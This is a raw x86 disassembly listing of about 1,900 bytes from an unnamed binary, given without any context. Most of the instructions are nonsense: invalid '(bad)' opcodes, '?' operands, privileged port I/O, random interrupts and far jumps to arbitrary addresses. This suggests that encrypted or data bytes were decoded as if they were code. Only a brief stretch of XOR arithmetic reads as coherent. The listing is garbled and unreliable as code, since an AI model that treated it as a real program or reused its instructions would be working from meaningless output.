  415a04:	fist   WORD PTR [edx-0x7c484b20]
  415a0a:	sub    al,0x6b
  415a0c:	xchg   BYTE PTR [ebp+0x75],bl
  415a0f:	push   esi
  415a10:	cmp    ebp,DWORD PTR [ecx-0x25]
  415a13:	ficomp DWORD PTR [ebp+ecx*8-0x3ffacc47]
  415a1a:	cmp    DWORD PTR [ebx],ebp
  415a1c:	enter  0xc697,0xf8
  415a20:	(bad)  
  415a21:	sbb    DWORD PTR [edx+0x23],esi
  415a24:	fs push cs
  415a26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a27:	les    edx,FWORD PTR [esi-0x404638d3]
  415a2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a2e:	sub    eax,0xf3ef04d
  415a33:	cmp    eax,0x8ca9a7ca
  415a38:	or     edi,DWORD PTR [esi+eax*4+0x9]
  415a3c:	in     eax,0xba
  415a3e:	sti    
  415a3f:	in     eax,0xe9
  415a41:	add    edx,esi
  415a43:	icebp  
  415a44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a45:	push   cs
  415a46:	mov    ebx,0x8c100823
  415a4b:	cs pop ebx
  415a4d:	push   esp
  415a4e:	cmp    ch,dh
  415a50:	inc    edx
  415a51:	add    esp,eax
  415a53:	inc    DWORD PTR [esp+edi*4]
  415a56:	(bad)  
  415a57:	out    dx,eax
  415a58:	shr    BYTE PTR [edx-0x6e4b8087],1
  415a5e:	lea    esp,[ebp+0x4a]
  415a61:	cmp    DWORD PTR [esi-0x31],eax
  415a64:	(bad)  
  415a65:	icebp  
  415a66:	jns    0x415a44
  415a68:	mov    dh,0x29
  415a6a:	mov    ds:0x3093d37a,eax
  415a6f:	push   ebp
  415a70:	mov    BYTE PTR [ecx+0x74],dh
  415a73:	je     0x415a73
  415a75:	cmp    DWORD PTR [esi],ecx
  415a77:	lods   eax,DWORD PTR ds:[esi]
  415a78:	in     al,0xde
  415a7a:	sub    al,0x77
  415a7c:	stos   BYTE PTR es:[edi],al
  415a7d:	out    0xf2,al
  415a7f:	ins    BYTE PTR es:[edi],dx
  415a80:	loope  0x415a69
  415a82:	sub    eax,0xece95ab4
  415a87:	push   es
  415a88:	shl    DWORD PTR [edi-0x7b722ecd],1
  415a8e:	add    bl,BYTE PTR [edx+esi*2-0x2016ffce]
  415a95:	add    al,BYTE PTR [eax]
  415a97:	add    BYTE PTR [edx],ch
  415a99:	push   eax
  415a9a:	fdivr  QWORD PTR [edx+ebp*2+0x616eaabc]
  415aa1:	pop    ecx
  415aa2:	xchg   ebp,eax
  415aa3:	aas    
  415aa4:	or     al,0xe5
  415aa6:	fisttp DWORD PTR [eax+edi*4]
  415aa9:	or     eax,0x7eb9707f
  415aae:	jo     0x415b20
  415ab0:	jmp    FWORD PTR [edi-0x6b]
  415ab3:	pop    ebp
  415ab4:	push   es
  415ab5:	dec    edi
  415ab6:	dec    ebx
  415ab7:	out    dx,al
  415ab8:	jbe    0x415a93
  415aba:	inc    eax
  415abb:	mov    edi,DWORD PTR [ebx+0x78]
  415abe:	jle    0x415b32
  415ac0:	fild   DWORD PTR [esi]
  415ac2:	out    dx,al
  415ac3:	xchg   ebx,eax
  415ac4:	mov    al,0x96
  415ac6:	mov    bl,0x65
  415ac8:	jbe    0x415abe
  415aca:	xor    edi,DWORD PTR [ebx+0x4195fdaa]
  415ad0:	out    0xa7,al
  415ad2:	data16 adc al,0xbf
  415ad5:	jb     0x415a63
  415ad7:	and    al,0x35
  415ad9:	fist   WORD PTR [esi]
  415adb:	add    BYTE PTR [edi],cl
  415add:	sub    dl,dl
  415adf:	popf   
  415ae0:	lods   al,BYTE PTR ds:[esi]
  415ae1:	sub    al,0x33
  415ae3:	jl     0x415aaa
  415ae5:	lahf   
  415ae6:	imul   ah
  415ae8:	push   esp
  415ae9:	add    WORD PTR [edi-0x28],si
  415aed:	jb     0x415b25
  415aef:	inc    DWORD PTR [edi]
  415af1:	ret    
  415af2:	cli    
  415af3:	sub    edi,ebp
  415af5:	xor    eax,0xdae536ab
  415afa:	(bad)
  415afe:	mov    ecx,0x4ed25f2d
  415b03:	xchg   esi,eax
  415b04:	mov    ?,eax
  415b06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b07:	inc    ecx
  415b08:	and    DWORD PTR [ecx-0x7f],eax
  415b0b:	aas    
  415b0c:	ret    
  415b0d:	ret    0x1666
  415b10:	lods   eax,DWORD PTR ds:[esi]
  415b11:	out    0x63,al
  415b13:	imul   esp,DWORD PTR [esi],0xd7021a45
  415b19:	outs   dx,DWORD PTR ds:[esi]
  415b1a:	push   ecx
  415b1b:	mov    esi,0x4b696d60
  415b20:	mov    dl,0xef
  415b22:	in     eax,0x1e
  415b24:	sbb    ebx,esp
  415b26:	jle    0x415aee
  415b28:	cdq    
  415b29:	xchg   DWORD PTR [esi+ebx*8+0x67],edi
  415b2d:	push   esp
  415b2e:	push   cs
  415b2f:	mov    BYTE PTR [eax+ebp*8-0x106699db],ch
  415b36:	div    BYTE PTR [ecx-0x56]
  415b39:	jno    0x415bb5
  415b3b:	fimul  DWORD PTR [eax-0x28ef84ed]
  415b41:	daa    
  415b42:	jae    0x415b4d
  415b44:	(bad)  
  415b45:	(bad)  
  415b46:	test   eax,0x1d505801
  415b4b:	pop    edi
  415b4c:	sub    edx,esi
  415b4e:	jno    0x415b0b
  415b50:	xor    BYTE PTR [esi+0x6f81d770],cl
  415b56:	scas   al,BYTE PTR es:[edi]
  415b57:	sub    bh,cl
  415b59:	mov    bh,0x54
  415b5b:	or     al,0xc0
  415b5d:	in     eax,dx
  415b5e:	push   ecx
  415b5f:	pusha  
  415b60:	jg     0x415b6c
  415b62:	int    0x7b
  415b64:	jae    0x415b1e
  415b66:	push   DWORD PTR [eax-0x625d628]
  415b6c:	lods   al,BYTE PTR ds:[esi]
  415b6d:	jmp    0x1ca9b3f2
  415b72:	sub    DWORD PTR [ecx],0xffffffd3
  415b75:	test   al,0xd4
  415b77:	cdq    
  415b78:	scas   al,BYTE PTR es:[edi]
  415b79:	push   ebp
  415b7a:	mov    ecx,0xcbcd567
  415b7f:	pop    es
  415b80:	aad    0xa7
  415b82:	aas    
  415b83:	pop    eax
  415b84:	inc    edx
  415b85:	mov    ecx,0x742e2192
  415b8a:	xchg   esp,eax
  415b8b:	xchg   ebx,eax
  415b8c:	ret    
  415b8d:	and    ah,bh
  415b8f:	int    0x2e
  415b91:	mov    bh,BYTE PTR [edx-0x63cd1e8f]
  415b97:	es push eax
  415b99:	loope  0x415bfb
  415b9b:	jne    0x415b23
  415b9d:	and    cl,BYTE PTR [edx+0x62]
  415ba0:	dec    ebx
  415ba1:	pushf  
  415ba2:	(bad)  
  415ba3:	fsubr  QWORD PTR [edi+0x18]
  415ba6:	loopne 0x415b82
  415ba8:	inc    esi
  415ba9:	imul   eax,ecx,0x8e41e272
  415baf:	call   0xb3a4d37d
  415bb4:	mov    cl,0xab
  415bb6:	pop    ebp
  415bb7:	push   es
  415bb8:	stos   DWORD PTR es:[edi],eax
  415bb9:	ror    DWORD PTR [esp-0x38],0xcb
  415bbe:	(bad)  
  415bbf:	pop    edi
  415bc0:	push   ecx
  415bc1:	loopne 0x415b4e
  415bc3:	mov    bl,0xd7
  415bc5:	outs   dx,DWORD PTR ds:[esi]
  415bc6:	cdq    
  415bc7:	lds    eax,FWORD PTR [edx-0x26663ccf]
  415bcd:	dec    esp
  415bce:	stos   DWORD PTR es:[edi],eax
  415bcf:	test   eax,edx
  415bd1:	mov    ds:0xa1fc3db3,al
  415bd6:	xor    al,0xb3
  415bd8:	sti    
  415bd9:	adc    edi,eax
  415bdb:	xor    bl,BYTE PTR [ebp-0x51]
  415bde:	sub    al,0xbe
  415be0:	pop    ecx
  415be1:	test   DWORD PTR [ecx+edx*2+0x64],esp
  415be5:	ror    BYTE PTR [ebx],cl
  415be7:	mov    ebp,0x6125d78c
  415bec:	retf   
  415bed:	cmp    BYTE PTR [esi-0x22],0x6a
  415bf1:	loopne 0x415bff
  415bf3:	test   cl,ah
  415bf5:	mov    WORD PTR [eax+0x5c],?
  415bf8:	push   ds
  415bf9:	lea    ecx,[eax+0x65]
  415bfc:	jmp    0x5fd:0x99af8cee
  415c03:	cdq    
  415c04:	test   bl,al
  415c06:	sar    DWORD PTR [ebx-0x8af0d39],1
  415c0c:	and    BYTE PTR [esi-0x4131c607],dh
  415c12:	dec    edx
  415c13:	sbb    bh,BYTE PTR [edx-0x54e251d7]
  415c19:	jae    0x415bac
  415c1b:	cmp    edx,ebp
  415c1d:	imul   edx,esi,0xed8ecdae
  415c23:	test   eax,0x894b38ec
  415c28:	mov    ecx,DWORD PTR [esi-0x4255b8af]
  415c2e:	nop
  415c2f:	add    BYTE PTR [ebp+esi*2+0x29d066a],bl
  415c36:	jae    0x415ca6
  415c38:	daa    
  415c39:	inc    ecx
  415c3a:	mov    eax,ds:0xba5d545a
  415c3f:	mov    dl,0x17
  415c41:	dec    esp
  415c42:	mov    dl,0xf6
  415c44:	push   edx
  415c45:	pop    eax
  415c46:	sbb    dh,BYTE PTR [esi+0x6f3bc759]
  415c4c:	aam    0x19
  415c4e:	pop    ds
  415c4f:	sbb    ebx,ecx
  415c51:	nop
  415c52:	and    eax,0x478b6cc6
  415c57:	sbb    DWORD PTR [esi],0xffffff9c
  415c5a:	xchg   BYTE PTR [ecx-0xc646175],ch
  415c60:	mov    ds:0x871dd436,al
  415c65:	sub    BYTE PTR [edx],al
  415c67:	out    0x3c,al
  415c69:	mov    ch,0x5e
  415c6b:	jecxz  0x415bfc
  415c6d:	jl     0x415c5e
  415c6f:	mov    esp,0xd93ec12
  415c74:	push   edi
  415c75:	xchg   esi,eax
  415c76:	pop    edi
  415c77:	dec    ebx
  415c78:	adc    bh,BYTE PTR [edi+esi*8+0x3744f012]
  415c7f:	imul   DWORD PTR [edx+0x543dc9a]
  415c85:	retf   0x87f5
  415c88:	fcomp  st(2)
  415c8a:	and    eax,0xa57e90cd
  415c8f:	inc    ebp
  415c90:	int    0x8f
  415c92:	mov    ebp,0x46379c39
  415c97:	push   ecx
  415c98:	stos   BYTE PTR es:[edi],al
  415c99:	sbb    eax,DWORD PTR [ebx-0x32]
  415c9c:	mov    edi,DWORD PTR [ebx+0x19]
  415c9f:	retf   
  415ca0:	inc    esp
  415ca1:	pop    eax
  415ca2:	cmp    DWORD PTR [edi-0x56],edx
  415ca5:	pop    ebx
  415ca6:	out    dx,eax
  415ca7:	or     bh,ch
  415ca9:	and    dh,BYTE PTR [edx-0xd0a8fd5]
  415caf:	pop    edi
  415cb0:	mov    dl,0xa1
  415cb2:	popf   
  415cb3:	push   0x85a8e4c6
  415cb8:	test   eax,0xdb7bac4
  415cbd:	in     eax,0x28
  415cbf:	fnstenv [esp+esi*1]
  415cc2:	adc    al,0x87
  415cc4:	clc    
  415cc5:	idiv   DWORD PTR [esi]
  415cc7:	int3   
  415cc8:	push   ecx
  415cc9:	mov    ds:0xb7d3c195,eax
  415cce:	mov    al,0xa9
  415cd0:	jecxz  0x415d06
  415cd2:	stc    
  415cd3:	das    
  415cd4:	call   0xa40b02f
  415cd9:	mov    al,0xb4
  415cdb:	mov    al,0x6c
  415cdd:	ret    0xe40d
  415ce0:	jl     0x415d28
  415ce2:	sbb    eax,edi
  415ce4:	leave  
  415ce5:	rol    DWORD PTR [esi],cl
  415ce7:	scas   al,BYTE PTR es:[edi]
  415ce8:	cmp    eax,0x596d0cb0
  415ced:	je     0x415cb4
  415cef:	mov    dl,0xa4
  415cf1:	int3   
  415cf2:	test   eax,0x417aa8d7
  415cf7:	repnz leave 
  415cf9:	add    esi,DWORD PTR [edx+0x56]
  415cfc:	mov    al,ds:0x452ffd67
  415d01:	mov    edx,0xbd89997a
  415d06:	jo     0x415c9a
  415d08:	sbb    BYTE PTR [edi-0x6],ah
  415d0b:	adc    eax,0x6b933e89
  415d10:	or     al,0x1
  415d12:	imul   esi,ebp,0xde54dc4e
  415d18:	icebp  
  415d19:	add    bl,cl
  415d1b:	cmp    BYTE PTR [edi],0x53
  415d1e:	es xor ecx,ebx
  415d21:	sbb    BYTE PTR [edx+0x3f],al
  415d24:	add    BYTE PTR [edx+edi*1-0x7a],dh
  415d28:	iret   
  415d29:	add    DWORD PTR [ebx-0x1f11222f],eax
  415d2f:	cmp    DWORD PTR [ebp-0x650fa918],ebp
  415d35:	ss push ds
  415d37:	das    
  415d38:	xchg   BYTE PTR [ebp-0x23],ah
  415d3b:	mov    ds:0x4cd78fb,eax
  415d40:	or     DWORD PTR [ecx-0x267d7d4b],0x4d7a0b2a
  415d4a:	dec    eax
  415d4b:	mov    ds,WORD PTR [ebx+0x564e0049]
  415d51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d52:	pop    ebp
  415d53:	lods   al,BYTE PTR ds:[esi]
  415d54:	rcr    BYTE PTR [edx-0x6d1b8b2f],cl
  415d5a:	mov    bh,0xc8
  415d5c:	je     0x415d2f
  415d5e:	out    dx,al
  415d5f:	int3   
  415d60:	ja     0x415d2f
  415d62:	xchg   DWORD PTR [edi+0x28dc5506],eax
  415d68:	jmp    0xd3c5:0x7898cbb3
  415d6f:	xchg   edi,eax
  415d70:	loop   0x415d23
  415d72:	or     DWORD PTR [esi-0x745a65c0],ecx
  415d78:	push   ebp
  415d79:	or     BYTE PTR [ebx+0x489dc7d],cl
  415d7f:	xchg   edi,eax
  415d80:	mov    eax,DWORD PTR [ebp-0x18]
  415d83:	jmp    0x416067
  415d88:	dec    eax
  415d89:	fistp  QWORD PTR [edx+0x75a9712b]
  415d8f:	arpl   bx,ax
  415d91:	pop    ss
  415d92:	jp     0x415d95
  415d94:	mov    bl,0xd8
  415d96:	fmul   DWORD PTR [esi+0x707f0a81]
  415d9c:	mov    ecx,0x9070707e
  415da1:	pop    esi
  415da2:	arpl   WORD PTR [ebp-0x1f],bp
  415da5:	shl    DWORD PTR [ebx+0x93dafe7],0x89
  415dac:	les    edi,FWORD PTR [edi+0x3b]
  415daf:	aas    
  415db0:	adc    esp,edx
  415db2:	sub    DWORD PTR [ebp+0x18],0xffffffd7
  415db6:	push   edi
  415db7:	pop    ecx
  415db8:	rol    ah,cl
  415dba:	mov    cl,0x4c
  415dbc:	adc    al,0x18
  415dbe:	or     ah,BYTE PTR [edx]
  415dc0:	in     eax,dx
  415dc1:	repnz out 0x2b,eax
  415dc4:	push   DWORD PTR [ecx]
  415dc6:	stos   BYTE PTR es:[edi],al
  415dc7:	in     al,0x97
  415dc9:	xor    eax,0xfb967c5a
  415dce:	mov    dl,0xa0
  415dd0:	sahf   
  415dd1:	mov    ?,WORD PTR [ecx+0x1fe7f3e0]
  415dd7:	mov    ecx,0xc9867d1b
  415ddc:	mov    bl,0xb0
  415dde:	pop    ecx
  415ddf:	adc    DWORD PTR [ecx+0x45],esp
  415de2:	nop
  415de3:	dec    edi
  415de4:	lds    ebx,FWORD PTR [esi-0x2f]
  415de7:	inc    esi
  415de8:	scas   al,BYTE PTR es:[edi]
  415de9:	add    esi,DWORD PTR [edx+0x43]
  415dec:	pop    es
  415ded:	dec    ecx
  415dee:	inc    BYTE PTR [esi]
  415df0:	aaa    
  415df1:	sub    eax,0xedffe7a4
  415df6:	ret    0x4d36
  415df9:	dec    ebx
  415dfa:	cmp    DWORD PTR [ebp+0x4515064c],ebp
  415e00:	addr16 push ss
  415e02:	push   ecx
  415e03:	mov    ch,0x1c
  415e05:	pop    edi
  415e06:	leave  
  415e07:	imul   esp,DWORD PTR [ecx],0xffffffbd
  415e0a:	xor    eax,0x920d075a
  415e0f:	out    0x33,al
  415e11:	nop
  415e12:	cs ja  0x415e57
  415e15:	test   eax,0xe51f83c3
  415e1a:	dec    ebp
  415e1b:	test   al,0x2a
  415e1d:	mov    edx,0x336b748f
  415e22:	loope  0x415e5a
  415e24:	je     0x415e31
  415e26:	dec    esi
  415e27:	cmp    BYTE PTR [ecx+eax*1+0x6c],bl
  415e2b:	sbb    al,0x87
  415e2d:	push   edi
  415e2e:	cmp    dh,BYTE PTR [edx-0x3e9568eb]
  415e34:	cmc    
  415e35:	outs   dx,BYTE PTR ds:[esi]
  415e36:	and    eax,0xf20016f5
  415e3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e3c:	mov    ds:0xa8a13c63,al
  415e41:	into   
  415e42:	xor    ebp,DWORD PTR [ebx]
  415e44:	ja     0x415dde
  415e46:	iret   
  415e47:	fisubr DWORD PTR [ebx]
  415e49:	gs pusha 
  415e4b:	aaa    
  415e4c:	mov    ?,WORD PTR [edi]
  415e4e:	cli    
  415e4f:	pop    ebx
  415e50:	sbb    BYTE PTR [edx],ah
  415e52:	outs   dx,BYTE PTR ds:[esi]
  415e53:	xchg   esi,eax
  415e54:	lods   al,BYTE PTR ds:[esi]
  415e55:	xlat   BYTE PTR ds:[ebx]
  415e56:	mov    WORD PTR [ebx+edx*2],cs
  415e59:	je     0x415e50
  415e5b:	inc    ebp
  415e5c:	mov    eax,ds:0x48589e2b
  415e61:	and    al,0x6f
  415e63:	inc    ebp
  415e64:	jnp    0x415e10
  415e66:	loop   0x415df6
  415e68:	cld    
  415e69:	in     eax,dx
  415e6a:	fsub   QWORD PTR [eax-0x510fe70]
  415e70:	xchg   ebx,eax
  415e71:	push   0x5ab4875f
  415e76:	mov    ecx,0xff840b61
  415e7b:	mov    dl,0x8e
  415e7d:	xor    dh,dl
  415e7f:	nop
  415e80:	sub    al,0x87
  415e82:	pop    ecx
  415e83:	clc    
  415e84:	ud0    edi,DWORD PTR [ecx+0x7c397bef]
  415e8b:	lds    edx,FWORD PTR [esi]
  415e8d:	sbb    WORD PTR [edx-0x40],0x599d
  415e93:	outs   dx,DWORD PTR ds:[esi]
  415e94:	fucomip st,st(4)
  415e96:	into   
  415e97:	mov    ch,0xec
  415e99:	jmp    0x24c182f1
  415e9e:	jne    0x415e98
  415ea0:	call   0x8728dee7
  415ea5:	adc    ah,BYTE PTR [edi+0x47cd6d]
  415eab:	mov    bl,0x69
  415ead:	int    0x1d
  415eaf:	(bad)  [eax]
  415eb1:	jl     0x415e64
  415eb3:	sbb    esi,DWORD PTR [eax-0x34]
  415eb6:	outs   dx,BYTE PTR ds:[esi]
  415eb7:	cmp    BYTE PTR [edi+0x48],dh
  415eba:	call   DWORD PTR [ebp+0x659cccd7]
  415ec0:	add    DWORD PTR [ebp+0x78],0x45
  415ec4:	iret   
  415ec5:	sub    ch,BYTE PTR [ebp-0x6e]
  415ec8:	push   ebx
  415ec9:	in     eax,dx
  415eca:	jge    0x415f0a
  415ecc:	in     eax,0x14
  415ece:	sti    
  415ecf:	iret   
  415ed0:	loope  0x415eca
  415ed2:	sub    eax,DWORD PTR [ecx+eiz*4]
  415ed5:	sub    BYTE PTR [esi-0x46],0x5b
  415ed9:	sub    bl,BYTE PTR [esi-0x56777812]
  415edf:	(bad)  
  415ee0:	jge    0x415f10
  415ee2:	xor    al,0x36
  415ee4:	leave  
  415ee5:	ficomp WORD PTR [edx+0x5]
  415ee8:	adc    cl,BYTE PTR [ecx+0x68ecc57c]
  415eee:	xchg   ebp,eax
  415eef:	mov    al,0x62
  415ef1:	inc    esp
  415ef2:	push   ebx
  415ef3:	adc    al,0xf8
  415ef5:	ds fwait
  415ef7:	clc    
  415ef8:	sub    eax,0xd965b226
  415efd:	out    dx,eax
  415efe:	fiadd  WORD PTR [edi-0x18]
  415f01:	test   BYTE PTR [edx+0x6],bh
  415f04:	and    BYTE PTR [ebp-0x6f],al
  415f07:	mov    ah,0xac
  415f09:	daa    
  415f0a:	das    
  415f0b:	push   cs
  415f0c:	push   ebp
  415f0d:	jmp    0x6138:0x923ba4a9
  415f14:	push   edi
  415f15:	hlt    
  415f16:	imul   DWORD PTR [ebx]
  415f18:	xchg   ebx,eax
  415f19:	rol    eax,1
  415f1b:	mov    dh,0xb0
  415f1d:	add    BYTE PTR [eax+0x2d322afa],dh
  415f23:	scas   eax,DWORD PTR es:[edi]
  415f24:	pop    esp
  415f25:	cdq    
  415f26:	loopne 0x415ee3
  415f28:	loope  0x415f53
  415f2a:	sbb    ecx,esp
  415f2c:	inc    esp
  415f2d:	loopne 0x415f0a
  415f2f:	ds dec ebp
  415f31:	sub    DWORD PTR [esi-0x2fb25f09],eax
  415f37:	ins    DWORD PTR es:[edi],dx
  415f38:	and    ch,cl
  415f3a:	add    dh,BYTE PTR [eax]
  415f3c:	xor    BYTE PTR [ecx-0x373e0572],0x14
  415f43:	mov    edi,0x919a169f
  415f48:	and    DWORD PTR [ecx-0x38],0x73d9d846
  415f4f:	mov    bl,0x61
  415f51:	ficom  DWORD PTR [ebp-0x67af0b7b]
  415f57:	in     eax,0x72
  415f59:	rcl    DWORD PTR [esi+eax*8+0x1757f50e],1
  415f60:	or     BYTE PTR [eax-0x45],ah
  415f63:	jae    0x415fa5
  415f65:	dec    ecx
  415f66:	loopne 0x415f89
  415f68:	ins    DWORD PTR es:[edi],dx
  415f69:	add    ah,BYTE PTR [esi]
  415f6b:	sub    BYTE PTR [edx+0x28],cl
  415f6e:	out    0x9,eax
  415f70:	mov    edi,0xaf651d96
  415f75:	cmp    al,BYTE PTR [edi-0x74776abf]
  415f7b:	in     al,0x83
  415f7d:	sahf   
  415f7e:	mov    bh,0xd7
  415f80:	jecxz  0x416001
  415f82:	jl     0x415f71
  415f84:	xor    bh,BYTE PTR [edi-0x44feaf68]
  415f8a:	or     eax,0x90086d2f
  415f8f:	das    
  415f90:	push   ds
  415f91:	and    ah,dh
  415f93:	icebp  
  415f94:	mov    cs,WORD PTR [esi-0x46]
  415f97:	cmp    eax,DWORD PTR [ecx-0x67]
  415f9a:	ss push edx
  415f9c:	call   0x94eea9b7
  415fa1:	pop    ebp
  415fa2:	cmp    ebp,esp
  415fa4:	jo     0x41601d
  415fa6:	loope  0x415fa5
  415fa8:	sbb    eax,0x6ff5fd4e
  415fad:	inc    edx
  415fae:	inc    esp
  415faf:	adc    eax,0x4ce93fa1
  415fb4:	mov    edx,ebx
  415fb6:	imul   esi,DWORD PTR ds:0xe5378646,0x55b080d4
  415fc0:	sub    al,0xda
  415fc2:	clc    
  415fc3:	rcr    BYTE PTR [esi+0x5d],1
  415fc6:	rcl    DWORD PTR [ebx-0x1c606825],0xa9
  415fcd:	arpl   WORD PTR [ecx],cx
  415fcf:	pop    ss
  415fd0:	xchg   edi,eax
  415fd1:	fisubr WORD PTR ds:0x30bb0d30
  415fd7:	int3   
  415fd8:	jge    0x19a16ddd
  415fde:	add    ecx,DWORD PTR [ecx-0x45c095ef]
  415fe4:	outs   dx,BYTE PTR ds:[esi]
  415fe5:	ret    
  415fe6:	arpl   WORD PTR [edx-0x61e6e585],cx
  415fec:	dec    edi
  415fed:	ror    DWORD PTR [ecx+0x79],cl
  415ff0:	and    eax,0x9be3f1fa
  415ff5:	pop    ebx
  415ff6:	and    edi,DWORD PTR [edx-0x705ec6f8]
  415ffc:	test   BYTE PTR [ebp+0xe],bh
  415fff:	repnz das 
  416001:	lock stc 
  416003:	out    dx,eax
  416004:	cwde   
  416005:	repz and ebx,esi
  416008:	mov    ebp,0xe835b50a
  41600d:	pop    ebx
  41600e:	cs clc 
  416010:	inc    edi
  416011:	out    0x7,eax
  416013:	div    DWORD PTR ds:0x69b512eb
  416019:	jge    0x41606d
  41601b:	xor    edi,DWORD PTR [esp+ecx*4-0x52]
  41601f:	ret    
  416020:	clc    
  416021:	sub    DWORD PTR [ecx+0x7d640399],ebx
  416027:	sar    DWORD PTR [ebp+0x24],cl
  41602a:	xlat   BYTE PTR ds:[ebx]
  41602b:	imul   esp,DWORD PTR [edx+0x78],0x1d
  41602f:	cli    
  416030:	out    dx,eax
  416031:	(bad)  
  416032:	xchg   ebp,eax
  416033:	mov    dl,0x3c
  416035:	addr16 or al,0xaf
  416038:	daa    
  416039:	jo     0x416087
  41603b:	fistp  QWORD PTR [ecx+0x4b]
  41603e:	iret   
  41603f:	and    eax,0x548fca2b
  416044:	repz mov ss,edi
  416047:	or     bh,cl
  416049:	nop
  41604a:	pop    esi
  41604b:	mov    BYTE PTR [ecx],0xd0
  41604e:	adc    ebx,ebx
  416050:	and    al,0x37
  416052:	sub    ebp,DWORD PTR [ebp+0x4d]
  416055:	loop   0x4160ca
  416057:	sub    esp,DWORD PTR [edx+0x380c7ff9]
  41605d:	jno    0x41607f
  41605f:	push   ecx
  416060:	lods   eax,DWORD PTR ds:[esi]
  416061:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416062:	pop    esi
  416063:	(bad)  
  416064:	push   ss
  416065:	daa    
  416066:	scas   al,BYTE PTR es:[edi]
  416067:	mov    edx,DWORD PTR [ebp+0x8]
  41606a:	xor    eax,ecx
  41606c:	lea    eax,[eax+edx*1+0x32729c]
  416073:	mov    DWORD PTR [ebp+0x8],eax
  416076:	mov    eax,DWORD PTR [ebp-0x18]
  416079:	mov    edx,DWORD PTR [ebp+0x14]
  41607c:	xor    eax,ecx
  41607e:	add    eax,esi
  416080:	imul   eax,DWORD PTR [edx]
  416083:	mov    edx,DWORD PTR [ebp-0x4]
  416086:	xor    edx,ecx
  416088:	jmp    0x41636c
  41608d:	adc    ecx,DWORD PTR [edx]
  41608f:	iret   
  416090:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416091:	aad    0x61
  416093:	jae    0x41603f
  416095:	jl     0x4160ed
  416097:	cs jge 0x416105
  41609a:	lods   al,BYTE PTR ds:[esi]
  41609b:	or     ecx,ecx
  41609d:	retf   0x7f17
  4160a0:	jo     0x41605b
  4160a2:	jle    0x416114
  4160a4:	jo     0x416052
  4160a6:	dec    edx
  4160a7:	mov    ch,0xc9
  4160a9:	rol    bh,1
  4160ab:	loope  0x41603e
  4160ad:	lea    edx,[edi]
  4160af:	popa   
  4160b0:	adc    DWORD PTR [ebx+edi*8-0x2d],ecx
  4160b4:	shr    edi,cl
  4160b6:	repz pusha 
  4160b8:	mov    edx,0x5ad9224b
  4160bd:	test   BYTE PTR [edx-0x41],ch
  4160c0:	or     al,0x56
  4160c2:	shl    BYTE PTR [edi-0x45fd65e1],1
  4160c8:	fs aas 
  4160ca:	call   0xcddc16ca
  4160cf:	int    0x6f
  4160d1:	mov    dl,0x2d
  4160d3:	cwde   
  4160d4:	arpl   WORD PTR [edi-0x33],sp
  4160d7:	push   cs
  4160d8:	stc    
  4160d9:	aam    0x1f
  4160db:	dec    ebp
  4160dc:	int    0x66
  4160de:	data16 sub al,BYTE PTR [eax+0x1b8a99d6]
  4160e5:	dec    eax
  4160e6:	test   DWORD PTR [eax+0x27c46f26],0xd81dc5ec
  4160f0:	aas    
  4160f1:	jns    0x4160bf
  4160f3:	add    BYTE PTR [eax-0x3359ac89],ah
  4160f9:	xchg   BYTE PTR [esi+ebx*8-0x68],bl
  4160fd:	adc    DWORD PTR [ebx],esi
  4160ff:	call   0x64e4:0xc5189949
  416106:	and    eax,0xc967d0f
  41610b:	pop    esp
  41610c:	gs clc 
  41610e:	xor    al,0xf5
  416110:	mov    BYTE PTR [esi],dl
  416112:	out    0x2f,eax
  416114:	or     BYTE PTR ds:0xc41b45bd,ch
  41611a:	mov    esp,0x25bf58c8
  41611f:	int    0xd2
  416121:	mov    ebp,0xfdc5166a
  416127:	dec    edi
  416128:	xchg   edx,eax
  416129:	add    eax,0x68830d05
  41612e:	(bad)  
  41612f:	xor    cl,BYTE PTR [ecx+esi*4-0x28]
  416133:	inc    ecx
  416134:	push   ds
  416135:	xchg   DWORD PTR [ecx-0x68],eax
  416138:	adc    eax,esi
  41613a:	repnz lock (bad) 
  41613d:	mov    bl,0x8
  41613f:	in     eax,0xed
  416141:	xchg   BYTE PTR [edi+0x787a170b],ah
  416147:	push   es
  416148:	inc    DWORD PTR [esi-0x37]
  41614b:	add    BYTE PTR [eax+0x2a],dh
  41614e:	mov    ds:0x93c5a9b8,eax
  416153:	jmp    0x416160
  416155:	xor    eax,esp
  416157:	loopne 0x416187
  416159:	inc    esi
  41615a:	pusha  
  41615b:	xor    eax,0xb1d7395d
  416160:	dec    ecx
  416161:	das    
  416162:	mov    ds:0xccb11386,eax
  416167:	scas   al,BYTE PTR es:[edi]
  416168:	xor    DWORD PTR [ecx],esp
  41616a:	mov    ah,0x25
  41616c:	or     al,0xee
  41616e:	sbb    bl,ch
  416170:	xor    al,0xa8
  416172:	adc    al,0x95
  416174:	or     ebp,DWORD PTR ds:0xcd763871
  41617a:	and    eax,0xa3d4e21a
  41617f:	xchg   DWORD PTR [edx+0x607c49c6],ecx
  416185:	dec    eax
  416186:	dec    eax
  416187:	xlat   BYTE PTR ds:[ebx]
  416188:	inc    ebp
  416189:	or     edi,eax
  41618b:	out    0xf8,eax
  41618d:	sti    
  41618e:	(bad)  
  41618f:	jg     0x41618e
  416191:	and    ch,BYTE PTR [ebx+ecx*2+0x292e0efc]
  416198:	lods   eax,DWORD PTR ds:[esi]
  416199:	loopne 0x41615a
  41619b:	lahf   
  41619c:	sub    ah,dh
  41619e:	mov    esp,0x453ca177
  4161a3:	cld    
  4161a4:	loopne 0x416204
  4161a6:	dec    edi
  4161a7:	push   eax
  4161a8:	ror    BYTE PTR [eax],1
  4161aa:	ret    
  4161ab:	ficom  WORD PTR [ebp+0x1e]
  4161ae:	les    ebx,FWORD PTR [ebp-0x73bf1e6b]
  4161b4:	inc    cl
  4161b6:	push   cs
  4161b7:	pop    edx
  4161b8:	scas   eax,DWORD PTR es:[edi]
  4161b9:	dec    ebp
  4161ba:	mov    ecx,0xfc7a7a83
  4161bf:	pushf  
  4161c0:	scas   al,BYTE PTR es:[edi]
  4161c1:	daa    
  4161c2:	fild   QWORD PTR [esi]
  4161c4:	adc    BYTE PTR [ecx],dl
